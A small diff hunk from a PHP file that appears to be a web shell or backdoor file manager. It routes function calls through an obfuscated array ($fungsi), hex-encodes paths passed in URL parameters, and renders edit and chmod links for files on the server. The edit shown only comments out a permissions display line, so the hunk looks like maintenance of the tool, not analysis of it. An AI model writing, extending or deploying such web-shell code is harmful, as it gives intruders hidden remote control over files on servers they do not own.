@@ -828,8 +828,8 @@ if ($_GET['don'] == true) {
                                     } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
                                         echo '<font color="red">';
                                     }
-                                    echo perms($fungsi[0]() . '/' . $_D);
-                                    ?>
+                            // echo perms($fungsi[0]() . '/' . $_D);
+                        ?>
                                 </td>
                                 <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
                             </tr>
